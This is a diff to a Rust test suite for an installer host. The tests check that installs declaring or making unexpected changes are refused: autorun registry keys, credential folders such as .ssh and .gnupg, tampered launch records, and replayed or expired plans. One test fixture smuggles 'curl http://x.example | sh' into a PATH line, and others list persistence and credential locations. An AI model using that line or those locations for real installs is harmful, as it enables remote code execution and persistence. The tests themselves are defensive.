@@ -93,6 +93,7 @@ fn setup(name: &str, store_variant: Variant) -> Setup {
     let mut options = Options::default();
     options.home = Some(home);
     options.watch_registry = false;
+    options.settle = std::time::Duration::from_millis(100);
     // The tests run wherever a developer does, an elevated shell included: elevation is checked by its own test.
     options.allow_elevated = true;
     options.environment = {
@@ -104,7 +105,7 @@ fn setup(name: &str, store_variant: Variant) -> Setup {
         }
         env
     };
-    let programs = Programs::new(Shelf::new(dir.0.join("programs")), registry())
+    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
         .transport(transport.clone())
         .options(options);
     Setup {
@@ -115,6 +116,19 @@ fn setup(name: &str, store_variant: Variant) -> Setup {
     }
 }
 
+/// `Programs` over this setup's folders and world, with these options.
+trait ForTests {
+    fn unchecked_for_tests(s: &Setup, options: Options) -> Programs;
+}
+
+impl ForTests for Programs {
+    fn unchecked_for_tests(s: &Setup, options: Options) -> Programs {
+        Programs::new(Shelf::unchecked(s.dir.0.join("programs")), registry())
+            .transport(s.transport.clone())
+            .options(options)
+    }
+}
+
 fn install(
     s: &Setup,
     version: Option<&str>,
@@ -122,9 +136,13 @@ fn install(
 ) -> Result<Option<canoa_host::store::programs::Applied>, StoreError> {
     let settings = StoreSettings::default();
     let store = s.programs.store("echo_store", &settings)?;
-    let plan = s
-        .programs
-        .plan(&*store, action, None, version.map(str::to_owned))?;
+    let plan = s.programs.plan(
+        "echo_store",
+        &*store,
+        action,
+        None,
+        version.map(str::to_owned),
+    )?;
     s.programs.apply(
         "echo_store",
         &settings,
@@ -241,7 +259,7 @@ fn a_mismatched_download_leaves_the_current_copy_and_no_folder() {
         .expect("store");
     let plan = s
         .programs
-        .plan(&*store, Action::Update, None, None)
+        .plan("echo_store", &*store, Action::Update, None, None)
         .expect("plan");
     s.transport.serve(s.fixture.world(Variant::Mismatch));
     let error = s
@@ -329,7 +347,7 @@ fn an_undeclared_change_is_refused_named_and_the_version_folder_removed() {
     });
     let plan = s
         .programs
-        .plan(&*store, Action::Install, None, None)
+        .plan("echo_store", &*store, Action::Install, None, None)
         .expect("plan");
     let error = s
         .programs
@@ -379,8 +397,16 @@ enum Rig {
     LaunchesWithNodeOptions,
     /// Answers with a launch whose script is a file outside the version's folder.
     LaunchesAScriptElsewhere(PathBuf),
-    /// Declares the whole of HKCU.
-    DeclaresAllOfHkcu,
+    /// Declares a change of this registry key.
+    DeclaresRegistry(String),
+    /// Declares this folder as the program's own state.
+    DeclaresState(PathBuf),
+    /// Declares adding `dir` to the user's `PATH`, and writes `line` to the profile.
+    DeclaresPathLine { dir: PathBuf, line: String },
+    /// Declares a change of the profile, makes it, and fails.
+    WritesDeclaredThenFails,
+    /// Returns at once, and a moment later something it started writes the profile.
+    LingersThenWrites,
     /// Plans a download that nothing checks.
     PlansAnUnverifiedDownload,
 }
@@ -425,15 +451,38 @@ impl ProgramStore for Rigged {
             )),
             Rig::DeclaresPathWritesAlias => plan.changes.push(canoa::store::Change::new(
                 canoa::store::USER_PATH,
-                "PATH",
+                self.rc
+                    .parent()
+                    .expect("home")
+                    .join(".echo")
+                    .join("bin")
+                    .to_string_lossy(),
                 "adds a directory",
                 true,
             )),
-            Rig::DeclaresAllOfHkcu => plan.changes.push(canoa::store::Change::new(
+            Rig::DeclaresRegistry(key) => plan.changes.push(canoa::store::Change::new(
                 canoa::store::REGISTRY,
-                "HKCU",
-                "everything",
+                key.clone(),
+                "a key",
                 false,
+            )),
+            Rig::DeclaresState(dir) => plan.changes.push(canoa::store::Change::new(
+                canoa::store::STATE_DIR,
+                dir.to_string_lossy(),
+                "state",
+                false,
+            )),
+            Rig::DeclaresPathLine { dir, .. } => plan.changes.push(canoa::store::Change::new(
+                canoa::store::USER_PATH,
+                dir.to_string_lossy(),
+                "adds a directory",
+                true,
+            )),
+            Rig::WritesDeclaredThenFails => plan.changes.push(canoa::store::Change::new(
+                canoa::store::PROFILE_FILE,
+                self.rc.to_string_lossy(),
+                "adds a line",
+                true,
             )),
             Rig::PlansAnUnverifiedDownload => {
                 for download in &mut plan.downloads {
@@ -495,7 +544,31 @@ impl ProgramStore for Rigged {
             Rig::TouchesAnotherProgram(path) => {
                 fs::write(path, b"changed by this install").expect("another program's file");
             }
-            Rig::DeclaresTheHome(_) | Rig::DeclaresAllOfHkcu | Rig::PlansAnUnverifiedDownload => {}
+            Rig::DeclaresTheHome(_)
+            | Rig::DeclaresRegistry(_)
+            | Rig::DeclaresState(_)
+            | Rig::PlansAnUnverifiedDownload => {}
+            Rig::DeclaresPathLine { line, .. } => {
+                let mut file = fs::OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(&self.rc)
+                    .expect("rc");
+                writeln!(file, "{line}").expect("write");
+            }
+            Rig::WritesDeclaredThenFails => {
+                let mut file = fs::OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(&self.rc)
+                    .expect("rc");
+                writeln!(file, "export PATH=$HOME/.echo/bin:$PATH").expect("write");
+                return Err(ProviderError::new(
+                    coqui_acp_api::guatiao::Status::GUATIAO_ERR_INTERNAL,
+                    "boom",
+                ));
+            }
+            Rig::LingersThenWrites => {}
             Rig::LaunchesWithNodeOptions | Rig::LaunchesAScriptElsewhere(_) => {
                 let mut outcome = self.engine.apply(&r, &s, &t, &p)?;
                 if let Some(launch) = outcome.launch.as_mut() {
@@ -521,7 +594,18 @@ impl ProgramStore for Rigged {
                 return Ok(outcome);
             }
         }
-        self.engine.apply(&r, &s, &t, &p)
+        let outcome = self.engine.apply(&r, &s, &t, &p);
+        if matches!(self.rig, Rig::LingersThenWrites) {
+            // Something the install started outlives it, and writes a moment after the apply has returned.
+            let rc = self.rc.clone();
+            std::thread::spawn(move || {
+                std::thread::sleep(std::time::Duration::from_millis(500));
+                if let Ok(mut file) = fs::OpenOptions::new().append(true).open(&rc) {
+                    let _ = writeln!(file, "export PATH=$HOME/.late/bin:$PATH");
+                }
+            });
+        }
+        outcome
     }
 }
 
@@ -551,7 +635,7 @@ fn apply_rigged(
 ) -> Result<Option<canoa_host::store::programs::Applied>, StoreError> {
     let mut plan = s
         .programs
-        .plan(&*store, Action::Install, None, None)
+        .plan("echo_store", &*store, Action::Install, None, None)
         .expect("plan");
     edit(&mut plan);
     s.programs.apply_store(
@@ -637,14 +721,15 @@ fn an_elevated_host_installs_only_when_told_it_may() {
     let mut options = Options::default();
     options.home = Some(s.dir.0.join("home"));
     options.watch_registry = false;
+    options.settle = std::time::Duration::from_millis(100);
     options.allow_elevated = false;
-    let programs = Programs::new(Shelf::new(s.dir.0.join("strict")), registry())
+    let programs = Programs::new(Shelf::unchecked(s.dir.0.join("strict")), registry())
         .transport(s.transport.clone())
         .options(options);
     let settings = StoreSettings::default();
     let store = programs.store("echo_store", &settings).expect("store");
     let plan = programs
-        .plan(&*store, Action::Install, None, None)
+        .plan("echo_store", &*store, Action::Install, None, None)
         .expect("plan");
     let result = programs.apply(
         "echo_store",
@@ -715,13 +800,6 @@ fn a_launch_that_sets_what_programs_load_or_names_a_script_elsewhere_is_refused(
 }
 
 #[test]
-fn a_declared_change_of_all_of_hkcu_is_refused() {
-    let s = setup("hkcu", Variant::Normal);
-    let error = apply_rigged(&s, rigged(&s, Rig::DeclaresAllOfHkcu), |_| {}).expect_err("refused");
-    assert!(format!("{error}").contains("declares"), "{error}");
-}
-
-#[test]
 fn a_declared_change_of_a_filesystem_root_is_refused() {
     let s = setup("rootchange", Variant::Normal);
     let root = std::env::temp_dir()
@@ -747,9 +825,10 @@ fn a_download_nothing_checks_needs_the_host_to_have_been_told_and_is_then_record
     let mut options = Options::default();
     options.home = Some(home);
     options.watch_registry = false;
+    options.settle = std::time::Duration::from_millis(100);
     options.allow_elevated = true;
     options.allow_unverified = true;
-    let programs = Programs::new(Shelf::new(dir.0.join("programs")), registry())
+    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
         .transport(s.transport.clone())
         .options(options);
     let store: Arc<dyn ProgramStore> = Arc::new(Rigged {
@@ -758,7 +837,7 @@ fn a_download_nothing_checks_needs_the_host_to_have_been_told_and_is_then_record
         rig: Rig::PlansAnUnverifiedDownload,
     });
     let plan = programs
-        .plan(&*store, Action::Install, None, None)
+        .plan("echo_store", &*store, Action::Install, None, None)
         .expect("plan");
     let applied = programs
         .apply_store(
@@ -786,7 +865,7 @@ fn a_plan_the_host_did_not_make_is_not_applied() {
         .expect("store");
     let mut plan = s
         .programs
-        .plan(&*store, Action::Install, None, None)
+        .plan("echo_store", &*store, Action::Install, None, None)
         .expect("plan");
     plan.token = "0".repeat(64);
     let error = s
@@ -814,7 +893,13 @@ fn a_downgrade_is_planned_and_shown_as_one() {
         .expect("store");
     let plan = s
         .programs
-        .plan(&*store, Action::Update, None, Some("1.0.0".to_owned()))
+        .plan(
+            "echo_store",
+            &*store,
+            Action::Update,
+            None,
+            Some("1.0.0".to_owned()),
+        )
         .expect("plan");
     assert_eq!(plan.from_version.as_deref(), Some("2.0.0"));
     assert_eq!(plan.version.as_deref(), Some("1.0.0"));
@@ -868,6 +953,7 @@ fn only_the_copy_the_person_picked_is_run_among_those_outside_the_host() {
     let mut options = Options::default();
     options.home = Some(s.dir.0.join("home"));
     options.watch_registry = false;
+    options.settle = std::time::Duration::from_millis(100);
     options.allow_elevated = true;
     options.environment = {
         let mut env = coqui_acp_api::Environment::new();
@@ -877,7 +963,7 @@ fn only_the_copy_the_person_picked_is_run_among_those_outside_the_host() {
         }
         env
     };
-    let programs = Programs::new(Shelf::new(s.dir.0.join("other-programs")), registry())
+    let programs = Programs::new(Shelf::unchecked(s.dir.0.join("other-programs")), registry())
         .transport(s.transport.clone())
         .options(options);
     let store = programs
@@ -903,4 +989,432 @@ fn only_the_copy_the_person_picked_is_run_among_those_outside_the_host() {
         })
         .expect("the picked copy is run");
     assert_eq!(version, "9.9.9");
+}
+
+fn refuses_with_declares(s: &Setup, rig: Rig) {
+    let error = apply_rigged(s, rigged(s, rig), |_| {}).expect_err("refused");
+    assert!(format!("{error}").contains("declares"), "{error}");
+}
+
+#[test]
+fn a_registry_target_is_normalised_and_only_a_programs_own_places_are_accepted() {
+    let s = setup("registrytargets", Variant::Normal);
+    for target in [
+        "HKCU",
+        "HKCU/",
+        "HKCU\\.",
+        "HKCU//",
+        "hkey_current_user\\",
+        "HKCU\\Software",
+        "HKCU\\Software\\Microsoft",
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion",
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKCU\\Software\\Acme\\..\\..\\Microsoft",
+    ] {
+        refuses_with_declares(&s, Rig::DeclaresRegistry(target.to_owned()));
+    }
+    let ok = apply_rigged(
+        &s,
+        rigged(
+            &s,
+            Rig::DeclaresRegistry("HKCU\\Software\\Acme\\Echo".to_owned()),
+        ),
+        |_| {},
+    );
+    assert!(ok.is_ok(), "a key of the program's own: {ok:?}");
+}
+
+#[test]
+fn a_state_folder_is_a_folder_named_for_the_program_and_never_a_place_the_system_reads() {
+    let s = setup("statetargets", Variant::Normal);
+    let home = s.dir.0.join("home");
+    for relative in [
+        "",
+        ".config",
+        ".ssh",
+        ".gnupg",
+        ".local/bin",
+        ".local",
+        "AppData",
+        "AppData/Roaming",
+        "AppData/Local",
+        "Library",
+        "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup",
+        "Documents",
+    ] {
+        refuses_with_declares(&s, Rig::DeclaresState(home.join(relative)));
+    }
+    let ok = apply_rigged(
+        &s,
+        rigged(&s, Rig::DeclaresState(home.join(".echo"))),
+        |_| {},
+    );
+    assert!(ok.is_ok(), "a folder named for the program: {ok:?}");
+}
+
+#[test]
+fn a_user_path_change_covers_exactly_the_line_that_adds_the_declared_directory() {
+    for (name, line) in [
+        ("otherdir", "export PATH=$HOME/.other/bin:$PATH"),
+        (
+            "payload",
+            "export PATH=$HOME/.echo/bin:$PATH; curl http://x.example | sh",
+        ),
+        ("substring", "alias path=\"$HOME/.echo/bin\""),
+    ] {
+        let s = setup(name, Variant::Normal);
+        let dir = s.dir.0.join("home").join(".echo").join("bin");
+        let rig = Rig::DeclaresPathLine {
+            dir,
+            line: line.to_owned(),
+        };
+        let error = apply_rigged(&s, rigged(&s, rig), |_| {}).expect_err(name);
+        assert!(
+            matches!(error, StoreError::Undeclared { .. }),
+            "{name}: {error}"
+        );
+    }
+    let s = setup("exactline", Variant::Normal);
+    let dir = s.dir.0.join("home").join(".echo").join("bin");
+    let rig = Rig::DeclaresPathLine {
+        dir,
+        line: "export PATH=$HOME/.echo/bin:$PATH".to_owned(),
+    };
+    let ok = apply_rigged(&s, rigged(&s, rig), |_| {});
+    assert!(ok.is_ok(), "{ok:?}");
+}
+
+#[test]
+fn an_uninstall_the_host_did_not_plan_is_refused_and_a_planned_one_removes_the_copy() {
+    let s = setup("uninstall", Variant::Normal);
+    install(&s, None, Action::Install)
+        .expect("installed")
+        .expect("applied");
+    let fabricated = InstallPlan::new(Action::Uninstall, None);
+    let error = s
+        .programs
+        .apply(
+            "echo_store",
+            &StoreSettings::default(),
+            &fabricated,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect_err("refused");
+    assert!(format!("{error}").contains("no such plan"), "{error}");
+    assert!(
+        current(&s).is_some(),
+        "a copy removed by a plan nobody made"
+    );
+    let removed = install(&s, None, Action::Uninstall).expect("a planned uninstall");
+    assert!(removed.is_none());
+    assert!(current(&s).is_none());
+}
+
+#[test]
+fn a_failed_install_that_declared_a_change_says_the_change_is_left_behind() {
+    let s = setup("leftbehind", Variant::Normal);
+    let error =
+        apply_rigged(&s, rigged(&s, Rig::WritesDeclaredThenFails), |_| {}).expect_err("failed");
+    let text = format!("{error}");
+    assert!(
+        text.contains("left behind") && text.contains(".bashrc"),
+        "{text}"
+    );
+}
+
+#[test]
+fn a_writer_that_outlives_the_apply_is_caught_in_the_settle_window() {
+    let s = setup("linger", Variant::Normal);
+    let mut options = Options::default();
+    options.home = Some(s.dir.0.join("home"));
+    options.watch_registry = false;
+    options.allow_elevated = true;
+    options.settle = std::time::Duration::from_millis(1500);
+    let programs = Programs::unchecked_for_tests(&s, options);
+    let s = Setup { programs, ..s };
+    let error = apply_rigged(&s, rigged(&s, Rig::LingersThenWrites), |_| {}).expect_err("caught");
+    assert!(matches!(error, StoreError::Undeclared { .. }), "{error}");
+}
+
+#[test]
+fn a_plan_is_applied_once() {
+    let s = setup("once", Variant::Normal);
+    let store = s
+        .programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    let plan = s
+        .programs
+        .plan("echo_store", &*store, Action::Install, None, None)
+        .expect("plan");
+    let apply = |plan: &InstallPlan| {
+        s.programs.apply(
+            "echo_store",
+            &StoreSettings::default(),
+            plan,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+    };
+    apply(&plan).expect("the first time");
+    let error = apply(&plan).expect_err("the second");
+    assert!(format!("{error}").contains("no such plan"), "{error}");
+}
+
+#[test]
+fn an_old_install_plan_cannot_put_an_older_version_over_a_newer_copy() {
+    let s = setup("stale", Variant::Normal);
+    let store = s
+        .programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    let old = s
+        .programs
+        .plan(
+            "echo_store",
+            &*store,
+            Action::Install,
+            None,
+            Some("1.0.0".to_owned()),
+        )
+        .expect("plan");
+    install(&s, None, Action::Install)
+        .expect("2.0.0")
+        .expect("applied");
+    let error = s
+        .programs
+        .apply(
+            "echo_store",
+            &StoreSettings::default(),
+            &old,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect_err("stale");
+    assert!(format!("{error}").contains("plan again"), "{error}");
+    assert_eq!(current(&s).expect("still").version, "2.0.0");
+}
+
+#[test]
+fn the_launch_must_lie_inside_the_copy_and_current_json_must_be_the_one_the_host_wrote() {
+    let s = setup("launchguard", Variant::Normal);
+    install(&s, None, Action::Install)
+        .expect("installed")
+        .expect("applied");
+    let store = s
+        .programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    s.programs.launch(&*store).expect("untouched");
+    let json = s.dir.0.join("programs/echo/current.json");
+    let original = fs::read_to_string(&json).expect("current.json");
+    // A launch that points at a program elsewhere.
+    let elsewhere = s.dir.0.join("elsewhere.exe");
+    fs::write(&elsewhere, b"x").expect("a file");
+    let current = current(&s).expect("current");
+    let edited = original.replace(
+        &current.launch.path.replace('\\', "\\\\"),
+        &elsewhere.to_string_lossy().replace('\\', "\\\\"),
+    );
+    assert_ne!(
+        edited, original,
+        "the launch path was found in current.json"
+    );
+    fs::write(&json, &edited).expect("tamper");
+    assert!(
+        s.programs.launch(&*store).is_err(),
+        "a launch outside the copy was handed out"
+    );
+    // Any other edit of the file changes its digest, which the host keeps elsewhere.
+    fs::write(
+        &json,
+        original.replace("\"version\": \"2.0.0\"", "\"version\": \"9.9.9\""),
+    )
+    .expect("tamper");
+    assert!(
+        s.programs.launch(&*store).is_err(),
+        "a changed current.json was trusted"
+    );
+    fs::write(&json, &original).expect("restore");
+    s.programs.launch(&*store).expect("as the host wrote it");
+}
+
+#[test]
+fn a_rollback_keeps_the_records_of_the_copy_it_returns_to() {
+    let s = setup("rollbackrecords", Variant::Normal);
+    install(&s, Some("1.0.0"), Action::Install)
+        .expect("1.0.0")
+        .expect("applied");
+    install(&s, None, Action::Update)
+        .expect("2.0.0")
+        .expect("applied");
+    let store = s
+        .programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    s.programs.rollback(&*store).expect("rolled back");
+    let launch = s.programs.launch(&*store).expect("the old copy, untouched");
+    let mut bytes = fs::read(&launch.path).expect("the program");
+    bytes.push(1);
+    fs::write(&launch.path, bytes).expect("tamper");
+    assert!(
+        s.programs.launch(&*store).is_err(),
+        "a rolled-back copy lost its records"
+    );
+}
+
+#[test]
+fn files_unpacked_from_an_archive_are_recorded_and_so_are_the_ones_added_later() {
+    let dir = Dir::new("archive");
+    let home = dir.0.join("home");
+    fs::create_dir_all(&home).expect("home");
+    let fixture = EchoFixture {
+        standin: standin(),
+        archive: true,
+    };
+    let transport = WorldTransport::new(fixture.world(Variant::Normal));
+    let mut options = Options::default();
+    options.home = Some(home);
+    options.watch_registry = false;
+    options.settle = std::time::Duration::from_millis(100);
+    options.allow_elevated = true;
+    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
+        .transport(transport)
+        .options(options);
+    let settings = StoreSettings::default();
+    let store = programs
+        .store("echo_archive_store", &settings)
+        .expect("store");
+    let plan = programs
+        .plan("echo_archive_store", &*store, Action::Install, None, None)
+        .expect("plan");
+    programs
+        .apply(
+            "echo_archive_store",
+            &settings,
+            &plan,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect("installed");
+    programs.launch(&*store).expect("untouched");
+    let readme = dir.0.join("programs/echo-archive/versions");
+    let version = fs::read_dir(&readme)
+        .expect("versions")
+        .flatten()
+        .next()
+        .expect("a version")
+        .path();
+    let data = version.join("app/data/readme.txt");
+    fs::write(&data, b"changed").expect("tamper");
+    assert!(
+        programs.launch(&*store).is_err(),
+        "an unpacked file changed unseen"
+    );
+    fs::write(&data, b"echo\n").expect("restore");
+    programs.launch(&*store).expect("as installed");
+    fs::write(version.join("app/data/added.txt"), b"new").expect("add");
+    assert!(programs.launch(&*store).is_err(), "a file was added unseen");
+}
+
+#[test]
+fn the_apply_lock_lets_one_install_run_at_a_time() {
+    let s = setup("applylock", Variant::Normal);
+    let held = s.programs.shelf().apply_lock().expect("the first");
+    assert!(matches!(
+        s.programs.shelf().apply_lock(),
+        Err(canoa_host::store::shelf::ShelfError::Held)
+    ));
+    let error = install(&s, None, Action::Install).expect_err("refused while another install runs");
+    assert!(format!("{error}").contains("holds"), "{error}");
+    drop(held);
+    install(&s, None, Action::Install)
+        .expect("after it")
+        .expect("applied");
+}
+
+#[test]
+fn a_plan_that_has_expired_or_was_pushed_out_is_not_applied() {
+    let s = setup("expiry", Variant::Normal);
+    let mut options = Options::default();
+    options.home = Some(s.dir.0.join("home"));
+    options.watch_registry = false;
+    options.allow_elevated = true;
+    options.settle = std::time::Duration::from_millis(50);
+    options.plan_ttl = std::time::Duration::from_millis(200);
+    options.plan_limit = 2;
+    let programs = Programs::unchecked_for_tests(&s, options);
+    let store = programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    let first = programs
+        .plan("echo_store", &*store, Action::Install, None, None)
+        .expect("plan");
+    std::thread::sleep(std::time::Duration::from_millis(400));
+    let error = programs
+        .apply(
+            "echo_store",
+            &StoreSettings::default(),
+            &first,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect_err("expired");
+    assert!(format!("{error}").contains("no such plan"), "{error}");
+    let a = programs
+        .plan(
+            "echo_store",
+            &*store,
+            Action::Install,
+            None,
+            Some("1.0.0".to_owned()),
+        )
+        .expect("a");
+    let _b = programs
+        .plan(
+            "other_one",
+            &*store,
+            Action::Install,
+            None,
+            Some("2.0.0".to_owned()),
+        )
+        .expect("b");
+    let _c = programs
+        .plan("other_two", &*store, Action::Install, None, None)
+        .expect("c");
+    let error = programs
+        .apply(
+            "echo_store",
+            &StoreSettings::default(),
+            &a,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect_err("pushed out");
+    assert!(format!("{error}").contains("no such plan"), "{error}");
+}
+
+#[test]
+fn a_plan_is_good_for_the_provider_that_made_it_only() {
+    let s = setup("provider", Variant::Normal);
+    let store = s
+        .programs
+        .store("echo_store", &StoreSettings::default())
+        .expect("store");
+    let plan = s
+        .programs
+        .plan("echo_store", &*store, Action::Install, None, None)
+        .expect("plan");
+    let error = s
+        .programs
+        .apply(
+            "echo_archive_store",
+            &StoreSettings::default(),
+            &plan,
+            Arc::new(Recorder::default()),
+            Arc::new(AtomicBool::new(false)),
+        )
+        .expect_err("another provider's");
+    assert!(format!("{error}").contains("no such plan"), "{error}");
 }
